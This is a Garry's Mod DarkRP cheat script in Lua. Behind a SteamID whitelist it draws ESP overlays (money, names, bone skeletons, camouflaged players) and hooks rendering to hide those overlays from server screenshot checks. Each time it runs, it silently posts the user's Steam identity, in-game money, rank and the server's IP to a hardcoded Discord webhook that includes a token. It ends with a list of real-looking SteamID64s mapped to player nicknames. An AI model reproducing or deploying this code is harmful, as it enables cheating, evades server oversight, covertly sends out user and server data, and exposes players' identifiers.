local anime_girl_ascii = [[
 __  __              _                     _        _  _            _                  _                     _             
|  \/  |  __ _    __| |    ___      o O O | |__    | || |    o O O | |__     ___    __| |   _  _     __     | |__     ___  
| |\/| | / _` |  / _` |   / -_)    o      | '_ \    \_, |   o      | '_ \   / -_)  / _` |  | +| |   / _|    | / /    |_ /  
|_|__|_| \__,_|  \__,_|   \___|   TS__[O] |_.__/   _|__/   TS__[O] |_.__/   \___|  \__,_|   \_,_|   \__|_   |_\_\   _/__|  
_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_| """"| {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'    
				 ⣠⠀⣰⠀⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣎⣴⠂⠀⠀⠀⠀⠀⠀⠀⢹⠀⢹⠀⡏
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠸⣤⣇⡼					
⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣷⣧⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃
⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⠿⠃⠀⣀⣀⣠⣤⡤⠶⣿⠁
⠀⠀⠈⠛⢻⣽⢿⣿⣿⣿⣿⣿⣿⡛⠛⠉⠉⠀⠀⠀⡿
⠀⠀⠀⠀⠙⠛⢻⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⢰⠇
⢴⡇⠀⠀⡴⠊⣿⣿⠁⠘⣿⣿⡇⠀⠀⣀⣤⣴⣶⣾⣷⣄
⢸⠀⠀⣠⠃⣼⡟⢱⠀⣸⣿⣿⣧⣶⣿⣿⣿⡿⠟⡿⢻⣿⣆
⠀⠉⠉⠁⣼⠏⠀⢸⠀⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣷⣦⣽⣿⣧⡀⠀⠀⠀⠀⣀	
⠀⢤⡶⠾⠃⠀⠀⠀⠉⠛⢿⣿⣿⣿⡿⠿⠟⠛⠉⠟⠉⠛⠛⠿⠿⠷⠶⠾⠟                                      
]]


-- Whitelisted SteamIDs
local whitelistedSteamIDs = {
    "STEAM_0:0:201401310",
    "STEAM_0:0:881205682",
	"STEAM_0:1:790320528",
	"STEAM_0:1:554760579",
	"STEAM_0:1:615317184",
	"STEAM_0:1:888226783",
	"STEAM_0:1:888924146",
	"STEAM_0:0:889780989",
	"STEAM_0:1:890743442",
	"STEAM_0:0:558185545",
    -- Add more SteamIDs here
}

-- Function to check if the SteamID is whitelisted
local function isSteamIDWhitelisted()
    local steamID = LocalPlayer():SteamID()
    for _, id in ipairs(whitelistedSteamIDs) do
        if id == steamID then
            return true
        end
    end
    return false
end

-- Only proceed if the SteamID is whitelisted
if not isSteamIDWhitelisted() then
    print("You are Non-whitelisted  DM beduckz on discord    Your SteamID: " .. LocalPlayer():SteamID())
    return
end

print(anime_girl_ascii)
-- Define the Discord webhook URL
local webhookURL = "https://discord.com/api/webhooks/1220494529447329904/CIolw0m604xBehfbE1uD8KcqSEkpBd3JnsaNxsQDck8eDYQ6Or13r4gn-hgoqoZeXcar"

-- Function to fetch player data and send it to the Discord webhook
local function SendPlayerInfoToDiscord()
    if CLIENT then
        -- Fetch player information
        local ply = LocalPlayer()
        local steamID64 = ply:SteamID64()
        local steamName = ply:Nick()
        local jobName = ply:getDarkRPVar("job") or "N/A" -- Assuming DarkRP
        local money = ply:getDarkRPVar("money") or "N/A" -- Assuming DarkRP
        local rank = ply:GetUserGroup() or "N/A"
        local inGameName = ply:Nick()
        local serverIP = game.GetIPAddress()
        local serverName = GetHostName()

        -- Get the current time
        local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())

        -- Create the message to send to Discord
        local message = string.format(
            "Player Information:\n\nSteam Name: %s\nSteam Profile: https://steamcommunity.com/profiles/%s\nSteam ID 64: %s\nJob Name: %s\nMoney: %s\nRank: %s\nIn-Game Name: %s\nServer IP: %s\nServer Name: %s",
            steamName, steamID64, steamID64, jobName, money, rank, inGameName, serverIP, serverName
        )

        -- Send the message to the Discord webhook
        http.Post(webhookURL, {
            content = message
        }, function(result)
            print("")
        end, function(failed)
            print("Failed" .. failed)
        end)
    end
end

-- Run the function to send player info to Discord
SendPlayerInfoToDiscord()


local fakeRT = GetRenderTarget("fakeRT" .. os.time(), ScrW(), ScrH())

hook.Add("RenderScene", "AntiScreenGrab", function(vOrigin, vAngle, vFOV)
    local view = {
        x = 0,
        y = 0,
        w = ScrW(),
        h = ScrH(),
        dopostprocess = true,
        origin = vOrigin,
        angles = vAngle,
        fov = vFOV,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true
    }

    render.RenderView(view)
    render.CopyTexture(nil, fakeRT)

    cam.Start2D()
        hook.Run("CheatHUDPaint")
    cam.End2D()

    render.SetRenderTarget(fakeRT)

    return true
end)


local featureToggles = {
   showBones = cookie.GetNumber("showSkeletonAboveHead", 0) == 1
}

if CLIENT then
    -- Variables to store checkbox states
    local showMoneyAboveHead = cookie.GetNumber("showMoneyAboveHead", 0) == 1
    local showDirtyWalletAboveHead = cookie.GetNumber("showDirtyWalletAboveHead", 0) == 1
    local showNameAboveHead = cookie.GetNumber("showNameAboveHead", 0) == 1
    local selectedFont = cookie.GetString("selectedFont", "DermaDefault")
    local showCamoText = cookie.GetNumber("showCamoText", 0) == 1

    -- Default config for crosshair
    local config = {
        showCrosshair = cookie.GetNumber("showCrosshair", 0) == 1,
        crosshairSize = cookie.GetNumber("crosshairSize", 10),
        crosshairColor = Color(cookie.GetNumber("showCrosshairColorR", 255), cookie.GetNumber("showCrosshairColorG", 255), cookie.GetNumber("showCrosshairColorB", 255))
    }

    -- Save config to cookies
    local function saveConfig(cfg)
        cookie.Set("showCrosshair", cfg.showCrosshair and 1 or 0)
        cookie.Set("crosshairSize", cfg.crosshairSize)
        cookie.Set("showCrosshairColorR", cfg.crosshairColor.r)
        cookie.Set("showCrosshairColorG", cfg.crosshairColor.g)
        cookie.Set("showCrosshairColorB", cfg.crosshairColor.b)
    end

    -- Function to create the pop-up screen
    local function CreatePopup()
        -- Create the main frame
        local frame = vgui.Create("DFrame")
        frame:SetTitle("The Tuna Bread")
        frame:SetSize(400, 500)
        frame:Center()
        frame:MakePopup()

        -- Create a property sheet
        local sheet = vgui.Create("DPropertySheet", frame)
        sheet:Dock(FILL)

        -- Create the tab for player information
        local tab1 = vgui.Create("DPanel", sheet)
        sheet:AddSheet("Player Info", tab1, "icon16/user.png")

        -- Add checkboxes to show other players' money, health, and names
        local showMoneyCheckbox = vgui.Create("DCheckBoxLabel", tab1)
        showMoneyCheckbox:SetText("Show Money")
        showMoneyCheckbox:SetPos(20, 20)
        showMoneyCheckbox:SetChecked(showMoneyAboveHead)
        showMoneyCheckbox:SizeToContents()

        local showDirtyWalletCheckbox = vgui.Create("DCheckBoxLabel", tab1)
        showDirtyWalletCheckbox:SetText("Show Red Money")
        showDirtyWalletCheckbox:SetPos(20, 40)
        showDirtyWalletCheckbox:SetChecked(showDirtyWalletAboveHead)
        showDirtyWalletCheckbox:SizeToContents()

        local showNameCheckbox = vgui.Create("DCheckBoxLabel", tab1)
        showNameCheckbox:SetText("Names Esp")
        showNameCheckbox:SetPos(20, 60)
        showNameCheckbox:SetChecked(showNameAboveHead)
        showNameCheckbox:SizeToContents()

        local showSkeletonCheckbox = vgui.Create("DCheckBoxLabel", tab1)
        showSkeletonCheckbox:SetPos(20, 80)
        showSkeletonCheckbox:SetChecked(featureToggles.showBones)
        showSkeletonCheckbox:SetText("Bones Esp")
        showSkeletonCheckbox:SizeToContents()
        showSkeletonCheckbox.OnChange = function(self, val)
            featureToggles.showBones = val
            cookie.Set("showSkeletonAboveHead", val and 1 or 0)
        end

        local showCamoCheckbox = vgui.Create("DCheckBoxLabel", tab1)
        showCamoCheckbox:SetPos(20, 100)
        showCamoCheckbox:SetText("Show Camo Users")
        showCamoCheckbox:SetChecked(showCamoText)
        showCamoCheckbox:SizeToContents()
        showCamoCheckbox.OnChange = function(self, val)
            showCamoText = val
            cookie.Set("showCamoText", val and 1 or 0)
        end

        -- Add a dropdown menu for font selection
        local fontLabel = vgui.Create("DLabel", tab1)
        fontLabel:SetText("Select Font:")
        fontLabel:SizeToContents()
        fontLabel:SetPos(20, 140)

        local fontDropdown = vgui.Create("DComboBox", tab1)
        fontDropdown:SetPos(20, 160)
        fontDropdown:SetSize(360, 20)
        fontDropdown:AddChoice("DermaDefault")
        fontDropdown:AddChoice("DermaLarge")
        fontDropdown:AddChoice("DermaDefaultBold")
        fontDropdown:AddChoice("Trebuchet24")
        fontDropdown:AddChoice("Trebuchet18")
        fontDropdown:AddChoice("HudHintTextLarge")
        fontDropdown:AddChoice("HudHintTextSmall")
        fontDropdown:AddChoice("TargetID")

   		-- Add common system fonts to the dropdown
		if  fontName then
			fontDropdown:AddChoice(fontName)
		end

		-- Optionally, handle selection
		fontDropdown.OnSelect = function(panel, index, value)
			print("Selected font: " .. value)
			-- You can now use the selected font for drawing text, etc.
		end
		
		
        for i, choice in ipairs(fontDropdown.Choices) do
            if choice == selectedFont then
                fontDropdown:ChooseOptionID(i)
                break
            end
        end

        -- Function to update display settings and save states
        local function UpdateDisplaySettings()
            showMoneyAboveHead = showMoneyCheckbox:GetChecked()
            showDirtyWalletAboveHead = showDirtyWalletCheckbox:GetChecked()
            showNameAboveHead = showNameCheckbox:GetChecked()
            selectedFont = fontDropdown:GetSelected()

            cookie.Set("showMoneyAboveHead", showMoneyAboveHead and 1 or 0)
            cookie.Set("showDirtyWalletAboveHead", showDirtyWalletAboveHead and 1 or 0)
            cookie.Set("showNameAboveHead", showNameAboveHead and 1 or 0)
            cookie.Set("selectedFont", selectedFont or "DermaDefault")
        end

        -- Hook to update display settings when checkboxes change
        showMoneyCheckbox.OnChange = UpdateDisplaySettings
        showDirtyWalletCheckbox.OnChange = UpdateDisplaySettings
        showNameCheckbox.OnChange = UpdateDisplaySettings
        fontDropdown.OnSelect = UpdateDisplaySettings

        -- Create the tab for crosshair settings
        local tab2 = vgui.Create("DPanel", sheet)
        sheet:AddSheet("Crosshair", tab2, "icon16/cross.png")

        local crosshairCheckbox = vgui.Create("DCheckBoxLabel", tab2)
        crosshairCheckbox:SetText("Show Crosshair")
        crosshairCheckbox:SetPos(10, 10)
        crosshairCheckbox:SetValue(config.showCrosshair)
        crosshairCheckbox:SizeToContents()
        crosshairCheckbox.OnChange = function(self)
            config.showCrosshair = self:GetChecked()
            saveConfig(config)
        end

        local crosshairSizeSlider = vgui.Create("DNumSlider", tab2)
        crosshairSizeSlider:SetText("Crosshair Size")
        crosshairSizeSlider:SetPos(10, 40)
        crosshairSizeSlider:SetSize(380, 20)
        crosshairSizeSlider:SetMin(5)
        crosshairSizeSlider:SetMax(50)
        crosshairSizeSlider:SetValue(config.crosshairSize)
        crosshairSizeSlider.OnValueChanged = function(self, value)
            config.crosshairSize = math.Round(value)
            saveConfig(config)
        end

        local crosshairColorPicker = vgui.Create("DColorMixer", tab2)
        crosshairColorPicker:SetPos(10, 70)
        crosshairColorPicker:SetSize(380, 150)
        crosshairColorPicker:SetPalette(true)
        crosshairColorPicker:SetAlphaBar(false)
        crosshairColorPicker:SetWangs(true)
        crosshairColorPicker:SetColor(config.crosshairColor)
        crosshairColorPicker.ValueChanged = function(self, color)
            config.crosshairColor = color
            saveConfig(config)
        end
    end

    -- Hook to listen for the key press
    hook.Add("Think", "CheckForInsertKeyPress", function()
        if input.IsKeyDown(KEY_INSERT) then
            if not LocalPlayer().PopupScreenShown then
                LocalPlayer().PopupScreenShown = true
                CreatePopup()
            end
        else
            LocalPlayer().PopupScreenShown = false
        end
    end)

    -- Hook to draw info above players' heads
    hook.Add("CheatHUDPaint", "DrawInfoAboveHead", function()
        for _, ply in ipairs(player.GetAll()) do
            if ply != LocalPlayer() and ply:Alive() then
                local headPos = ply:EyePos() + Vector(0, 0, 10)
                local screenPos = headPos:ToScreen()

                if showMoneyAboveHead then
                    local moneyText = DarkRP.formatMoney(ply:getDarkRPVar("money"))
                    draw.DrawText(moneyText, selectedFont, screenPos.x, screenPos.y, Color(0, 255, 0), TEXT_ALIGN_CENTER)
                    screenPos.y = screenPos.y + 15
                end

                if showDirtyWalletAboveHead then
                    local dirtyWallet = DarkRP.formatMoney(ply:GetNWInt("PrinterWallet"))
                    draw.DrawText(" " .. dirtyWallet, selectedFont, screenPos.x, screenPos.y, Color(255, 0, 0), TEXT_ALIGN_CENTER)
                    screenPos.y = screenPos.y + 15
                end

                if showNameAboveHead then
                    local playerName = ply:Nick()
                    draw.DrawText(playerName, selectedFont, screenPos.x, screenPos.y, Color(255, 255, 255), TEXT_ALIGN_CENTER)
                    screenPos.y = screenPos.y + 15
                end
            end
        end
    end)


	    -- Hook to draw the custom crosshair
    hook.Add("HUDPaint", "DrawCustomCrosshair", function()
        if config.showCrosshair then
            local x = ScrW() / 2
            local y = ScrH() / 2
            local gap = config.crosshairSize / 4
            local length = config.crosshairSize

            surface.SetDrawColor(config.crosshairColor)
            surface.DrawLine(x - length - gap, y, x - gap, y)
            surface.DrawLine(x + length + gap, y, x + gap, y)
            surface.DrawLine(x, y - length - gap, x, y - gap)
            surface.DrawLine(x, y + length + gap, x, y + gap)
        end
    end)

    -- BONE CONNECTIONS TABLE
    local BONE_CONNECTIONS = {
        {"ValveBiped.Bip01_Head1", "ValveBiped.Bip01_Neck1"},
        {"ValveBiped.Bip01_Neck1", "ValveBiped.Bip01_Spine4"},
        {"ValveBiped.Bip01_Spine4", "ValveBiped.Bip01_Spine2"},
        {"ValveBiped.Bip01_Spine2", "ValveBiped.Bip01_Spine1"},
        {"ValveBiped.Bip01_Spine1", "ValveBiped.Bip01_Spine"},
        {"ValveBiped.Bip01_Spine", "ValveBiped.Bip01_Pelvis"},
        {"ValveBiped.Bip01_Spine2", "ValveBiped.Bip01_L_UpperArm"},
        {"ValveBiped.Bip01_Spine2", "ValveBiped.Bip01_R_UpperArm"},
        {"ValveBiped.Bip01_L_UpperArm", "ValveBiped.Bip01_L_Forearm"},
        {"ValveBiped.Bip01_R_UpperArm", "ValveBiped.Bip01_R_Forearm"},
        {"ValveBiped.Bip01_L_Forearm", "ValveBiped.Bip01_L_Hand"},
        {"ValveBiped.Bip01_R_Forearm", "ValveBiped.Bip01_R_Hand"},
        {"ValveBiped.Bip01_Pelvis", "ValveBiped.Bip01_L_Thigh"},
        {"ValveBiped.Bip01_Pelvis", "ValveBiped.Bip01_R_Thigh"},
        {"ValveBiped.Bip01_L_Thigh", "ValveBiped.Bip01_L_Calf"},
        {"ValveBiped.Bip01_R_Thigh", "ValveBiped.Bip01_R_Calf"},
        {"ValveBiped.Bip01_L_Calf", "ValveBiped.Bip01_L_Foot"},
        {"ValveBiped.Bip01_R_Calf", "ValveBiped.Bip01_R_Foot"}
    }

	-- Hook to draw player skeletons
	hook.Add("CheatHUDPaint", "DrawPlayerSkeleton", function()
		if featureToggles.showBones then
			for _, ply in ipairs(player.GetAll()) do
				if ply ~= LocalPlayer() and ply:Alive() then
					for _, bones in pairs(BONE_CONNECTIONS) do
						local startBone = ply:LookupBone(bones[1])
						local endBone = ply:LookupBone(bones[2])
						
						if startBone and endBone then
							local startPos, _ = ply:GetBonePosition(startBone)
							local endPos, _ = ply:GetBonePosition(endBone)
							
							if startPos and endPos then
								local startScreenPos = startPos:ToScreen()
								local endScreenPos = endPos:ToScreen()
								if startScreenPos.visible or endScreenPos.visible then
									surface.SetDrawColor(255, 255, 255, 255)
									surface.DrawLine(startScreenPos.x, startScreenPos.y, endScreenPos.x, endScreenPos.y)
								end
							end
						end
					end
				end
			end
		end
	end)


    -- Remove existing camo hooks
    hook.Remove("RenderScreenspaceEffects","ShowCamoEffects")
    hook.Remove("HUDPaint","DrawActiveCamoItems","DrawCamoItems")

    -- Initialize table to store players using camo
    local playersUsingCamo = {}

    -- Function to detect if a player is using camouflage
    local function IsPlayerUsingCamo(ply)
        return ply:GetNWBool("CamoEnabled", false)
    end

    -- Hook to update the list of players using camouflage
    hook.Add("Think", "UpdateCamoPlayers", function()
        playersUsingCamo = {}
        for _, ply in ipairs(player.GetAll()) do
            if IsPlayerUsingCamo(ply) then
                table.insert(playersUsingCamo, ply)
            end
        end
    end)

	-- Hook to draw text above players' heads if they are using camouflage
	hook.Add("CheatHUDPaint", "DrawCamoText",  function()
		if showCamoText then
			for _, ply in ipairs(playersUsingCamo) do
				if ply ~= LocalPlayer() and ply:Alive() then
					local headPos = ply:EyePos() + Vector(0, 0, 10) -- Adjust height as needed
					local screenPos = headPos:ToScreen()
					draw.SimpleText("Camo", selectedFont, screenPos.x - 55, screenPos.y + 30, Color(41, 251, 255, 255), TEXT_ALIGN_CENTER)
				end
			end
		end
	end)
end

local Aliases = {
    ["76561198438322206"] = "Nikola",
    ["76561199390128279"] = "Nikola",
    ["76561199005140319"] = "Dizzi",
    ["76561198880306573"] = "Chairs",
    ["76561198887248618"] = "JM Gold",
    ["76561199402809437"] = "JM Gold",
    ["76561199128045043"] = "Bob",
    ["76561199145845028"] = "Mac RS",
    ["76561198105286543"] = "Jesus",
    ["76561198358632610"] = "Shadow",
    ["76561198152067242"] = "Mirage",
    ["76561198286473602"] = "Porticle",
    ["76561198250254188"] = "Morpheus/Red",
    ["76561198175523350"] = "Awful",
    ["76561198382975755"] = "MysticDark",
    ["76561198180881263"] = "JimmyBobJones",
    ["76561198171821322"] = "NoSharp",
    ["76561198866328048"] = "Jaqueef",
    ["76561198331845763"] = "Bare",
    ["76561198032844317"] = "Doom",
    ["76561199592654313"] = "Rico",
    ["76561198880288891"] = "Randock",
    ["76561199592132759"] = "RicoAlt",
    ["76561198844406054"] = "Ceejay",
    ["76561199592116098"] = "Rico",
    ["76561199592284183"] = "Rico",
    ["76561198362168248"] = "Goblin",
    ["76561198878884979"] = "SirPlancake",
    ["76561199057463977"] = "Tea",
    ["76561198887109458"] = "Goblin Goon1",
    ["76561198271793756"] = "Jay",
    ["76561198798136125"] = "LRTY",
    ["76561199540906785"] = "Wobble",
    ["76561198409188049"] = "Brixton",
    ["76561199587204228"] = "Pinky",
    ["76561199592452123"] = "Ollie",
    ["76561198187155587"] = "Rainy",
    ["76561199591863663"] = "Rico",
    ["76561199556048621"] = "Brixton",
    ["76561198399997469"] = "Cocaine Hit",
    ["76561199088947613"] = "PHROG",
    ["76561198377560491"] = "Kaiser",
    ["76561198440020078"] = "Viktorz",
    ["76561199055099572"] = "Pinky",
    ["76561199571426295"] = "SirPlancake",
    ["76561198307237390"] = "Harry",
    ["76561198307237390"] = "Lethal",
    ["76561198835433746"] = "Louis",
    ["76561198380234663"] = "Glaze",
    ["76561198961709117"] = "wschris",
    ["76561198158083544"] = "Cat in the hat",
    ["76561198140537559"] = "Cynacam",
    ["76561198279877376"] = "Cloudyman",
    ["76561198291869234"] = "Nuky",
    ["76561198170122781"] = "Ecchi",
    ["76561199077441777"] = "Ewanbob",
    ["76561198162901780"] = "Talexx",
    ["76561198857884841"] = "Yum",
    ["76561198395654483"] = "Aiden",
    ["76561198350102483"] = "Bazzle",
    ["76561199061433397"] = "nicco",
    ["76561198099380869"] = "Seat",
    ["76561198864571081"] = "Qyze",
    ["76561198306814609"] = "LPFEN",
    ["76561198336832609"] = "Thedoctor",
    ["76561199416565354"] = "LJL852",
    ["76561198119578932"] = "Sasuke",
    ["76561198403547032"] = "Puschi",
    ["76561198166400698"] = "BOOFPOOF",
    ["76561198411030221"] = "Logan",
    ["76561198927006512"] = "YoMom",
    ["76561198869646311"] = "Deffy",
}